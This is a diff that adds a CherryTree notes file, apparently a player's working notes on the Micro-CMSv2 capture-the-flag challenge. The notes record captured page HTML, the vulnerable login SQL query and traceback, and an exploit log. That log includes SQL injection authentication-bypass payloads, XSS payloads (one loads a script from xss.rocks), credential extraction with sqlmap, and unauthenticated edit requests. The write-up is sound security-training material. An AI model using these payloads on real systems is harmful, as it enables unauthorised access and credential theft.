@@ -1,0 +1,329 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Micro-CMSv2" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631118564" ts_lastsave="1631122132">
+    <node name="dirsearcher" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631118596" ts_lastsave="1631118729">
+      <rich_text>[12:30:25] Starting: 
+[12:31:21] 200 -  251B  - /d4ca78e5a4/home                                  
+[12:31:28] 200 -  361B  - /d4ca78e5a4/login                                 
+[12:31:29] 302 -  209B  - /d4ca78e5a4/logout  -&gt;  </rich_text>
+      <rich_text link="webs http://34.94.3.143/d4ca78e5a4/">http://34.94.3.143/d4ca78e5a4/</rich_text>
+      <rich_text>
+</rich_text>
+    </node>
+    <node name="/d4ca78e5a4/" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631118739" ts_lastsave="1631183761">
+      <rich_text scale="h1">source code:</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text scale="h2">HTML</rich_text>
+      <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Micro-CMS&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		
+		&lt;ul&gt;
+&lt;li&gt;&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/1">page/1</rich_text>
+      <rich_text>"&gt;Micro-CMS Changelog&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/2">page/2</rich_text>
+      <rich_text>"&gt;Markdown Test&lt;/a&gt;&lt;/li&gt;
+		&lt;/ul&gt;
+		&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/create">page/create</rich_text>
+      <rich_text>"&gt;Create a new page&lt;/a&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+
+</rich_text>
+      <rich_text scale="h2">After Login HTML</rich_text>
+      <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Micro-CMS&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/logout">logout</rich_text>
+      <rich_text>"&gt;Log out&lt;/a&gt;
+		&lt;ul&gt;
+&lt;li&gt;&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/1">page/1</rich_text>
+      <rich_text>"&gt;Micro-CMS Changelog&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/2">page/2</rich_text>
+      <rich_text>"&gt;Markdown Test&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/3">page/3</rich_text>
+      <rich_text>"&gt;Private Page&lt;/a&gt;&lt;/li&gt;
+		&lt;/ul&gt;
+		&lt;a href="</rich_text>
+      <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/create">page/create</rich_text>
+      <rich_text>"&gt;Create a new page&lt;/a&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+
+</rich_text>
+      <node name="page/1" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631118794" ts_lastsave="1631183982">
+        <rich_text scale="h1">Source Code:</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">HTML</rich_text>
+        <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Micro-CMS Changelog&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/">../</rich_text>
+        <rich_text>"&gt;&amp;lt;-- Go Home&lt;/a&gt;&lt;br&gt;
+		&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/edit/1">edit/1</rich_text>
+        <rich_text>"&gt;Edit this page&lt;/a&gt;
+		&lt;h1&gt;Micro-CMS Changelog&lt;/h1&gt;
+&lt;h2&gt;Version 2&lt;/h2&gt;
+&lt;p&gt;This version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.&lt;/p&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+
+</rich_text>
+        <rich_text scale="h2">Option Request</rich_text>
+        <rich_text>
+
+HEAD, OPTIONS, GET
+DELETE doesnt work
+</rich_text>
+      </node>
+      <node name="page/2" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631119025" ts_lastsave="1631119042">
+        <rich_text scale="h1">Source Code</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">HTML</rich_text>
+        <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Markdown Test&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/">../</rich_text>
+        <rich_text>"&gt;&amp;lt;-- Go Home&lt;/a&gt;&lt;br&gt;
+		&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/page/edit/2">edit/2</rich_text>
+        <rich_text>"&gt;Edit this page&lt;/a&gt;
+		&lt;h1&gt;Markdown Test&lt;/h1&gt;
+&lt;p&gt;Just testing some markdown functionality.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="adorable kitten" src="</rich_text>
+        <rich_text link="webs http://view-source:https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/">https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/</rich_text>
+        <rich_text>" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;button&gt;Some button&lt;/button&gt;&lt;/p&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</rich_text>
+      </node>
+      <node name="login" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631119190" ts_lastsave="1631119280">
+        <rich_text scale="h1">Source Code:</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">HTML</rich_text>
+        <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Log in&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:http://34.94.3.143/d4ca78e5a4/home">home</rich_text>
+        <rich_text>"&gt;&amp;lt;-- Go Home&lt;/a&gt;
+		&lt;h1&gt;Log In&lt;/h1&gt;
+		&lt;form method="POST"&gt;
+			Username: &lt;input type="text" name="username"&gt;&lt;br&gt;
+			Password: &lt;input type="password" name="password"&gt;&lt;br&gt;
+			&lt;input type="submit" value="Log In"&gt;
+			&lt;div style="color: red"&gt;&lt;/div&gt;
+		&lt;/form&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+
+</rich_text>
+        <rich_text scale="h1">Inputs</rich_text>
+        <rich_text>
+
+Username: &lt;input type="text" name="username"&gt;&lt;br&gt;
+Password: &lt;input type="password" name="password"&gt;&lt;br&gt;
+</rich_text>
+      </node>
+      <node name="page/create" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631183645" ts_lastsave="1631183690">
+        <rich_text scale="h1">Source Code:</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">HTML</rich_text>
+        <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Create page&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:http://35.227.24.107/0d952ac86e/">../</rich_text>
+        <rich_text>"&gt;&amp;lt;-- Go Home&lt;/a&gt;
+		&lt;h1&gt;Create Page&lt;/h1&gt;
+		&lt;form method="POST"&gt;
+			Title: &lt;input type="text" name="title"&gt;&lt;br&gt;
+			&lt;textarea name="body" rows="10" cols="80"&gt;&lt;/textarea&gt;&lt;br&gt;
+			&lt;input type="submit" value="Create"&gt;
+			&lt;div style="font-style: italic"&gt;&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet</rich_text>
+        <rich_text>"&gt;Markdown&lt;/a&gt; is supported, but scripts are not&lt;/div&gt;
+		&lt;/form&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+
+</rich_text>
+        <rich_text scale="h2">Inputs</rich_text>
+        <rich_text>
+
+title
+body
+</rich_text>
+      </node>
+      <node name="page/edit/4" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631183761" ts_lastsave="1631183770">
+        <rich_text scale="h1">Source Code</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">HTML</rich_text>
+        <rich_text>
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Edit page&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:http://35.227.24.107/0d952ac86e/">../../</rich_text>
+        <rich_text>"&gt;&amp;lt;-- Go Home&lt;/a&gt;
+		&lt;h1&gt;Edit Page&lt;/h1&gt;
+		&lt;form method="POST"&gt;
+			Title: &lt;input type="text" name="title" value="Test - Edit"&gt;&lt;br&gt;
+			&lt;textarea name="body" rows="10" cols="80"&gt;test page - Edit&lt;/textarea&gt;&lt;br&gt;
+			&lt;input type="submit" value="Save"&gt;
+			&lt;div style="font-style: italic"&gt;&lt;a href="</rich_text>
+        <rich_text link="webs http://view-source:https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet</rich_text>
+        <rich_text>"&gt;Markdown&lt;/a&gt; is supported, but scripts are not&lt;/div&gt;
+		&lt;/form&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</rich_text>
+      </node>
+    </node>
+    <node name="general" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631118857" ts_lastsave="1631184230">
+      <rich_text>- added authentication
+   → users need to be an admin to add or edit pages
+   → accessing /edit/1 and /edit/2 url redirected to /login if not logged in
+- url for create page is /page/create
+- sql string for executing login
+   → if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0
+- login with ' UNION SELECT 'test' #:test works
+- auth cookie after login
+   → l2session: eyJhZG1pbiI6dHJ1ZX0.FBtyvQ.80oiDSCcQtCnpiNcVsTTP2ofK6A
+      ⇒ erster teil ist {"admin":true}
+      ⇒ anderen beide teile sind nicht lesbare character
+- xss pages cannot be edited - post request result in 404
+   → works again if xss is removed</rich_text>
+    </node>
+    <node name="Exploit Ideas" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631119327" ts_lastsave="1631203953">
+      <rich_text>- /login
+   → trying test:test as credentials to gain information
+      ⇒ response send /login page with the info ‘Unknown user’
+      ⇒ usernames could be bruteforced
+   → trying admin:test
+      ⇒ ‘Unknown user’
+   → trying sql injection to gain access
+      ⇒ auth bypass payloads (</rich_text>
+      <rich_text link="webs https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt">https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt</rich_text>
+      <rich_text>)
+         • tried '--:test got error message
+
+Traceback (most recent call last):
+  File "./main.py", line 145, in do_login
+    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
+    self.errorhandler(self, exc, value)
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
+    raise errorvalue
+ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
+
+   → trying to exploit the found sql string to bypass authentication
+      ⇒ trying payload ' OR 1=1 -- with out URL encoding
+         • same error string
+      ⇒ trying different content type (application/json)
+         • didnt work got 400
+      ⇒ trying payload ' UNION SELECT password FROM admins #
+         • got different error message on /login
+         • Invalid password
+      ⇒ trying payload ' UNION SELECT 'test' #:test
+         • it worked
+   → trying to exploit the found sql string to get passwords
+      ⇒ sqlmap did some magic and found the username:password of the admin
+      ⇒ after login as admin the flag was shown
+
+- /page/create
+   → trying POST request to create page without login
+      ⇒ didnt work
+   → trying to add XSS in title and body
+      ⇒ payload </rich_text>
+      <rich_text family="monospace">&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</rich_text>
+      <rich_text>
+      ⇒ payload </rich_text>
+      <rich_text family="monospace">javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</rich_text>
+      <rich_text>
+         • works, but no flag
+   → trying sql injection for create input
+      ⇒ no sql injection possible (input/id)
+
+- /page/edit/&lt;id&gt;
+   → trying POST request to edit page without login (Broken access control)
+      ⇒ worked and got flag
+   → trying sql injection for edit input
+      ⇒ no sql injection possible (input/id)
+
+- /page/&lt;id&gt;
+   → trying to get credentials via sql injection and union attack to admins table
+      ⇒ testing injection possibility 
+         • 1337 UNION SELECT “test”, “test2” # and sqli payloads
+         • didnt work
+   → trying to bruteforce id</rich_text>
+    </node>
+    <node name="technologies" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631119784" ts_lastsave="1631119959">
+      <rich_text>- backend is written in python 2.7 (found by using sql injection on login)
+- MySQL is used for backend (found by using sql injection on login)</rich_text>
+    </node>
+    <node name="Flags" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631122132" ts_lastsave="1631203963">
+      <rich_text>- On Page /page/3 must be logged in as Admin (Broken Authentication)
+- Edit /page/1 without being logged in, by sending post request without cookie (Broken access control)
+- sqlmap magic on login form found username:password, after login as admin the flag got shown</rich_text>
+    </node>
+  </node>
+</cherrytree>
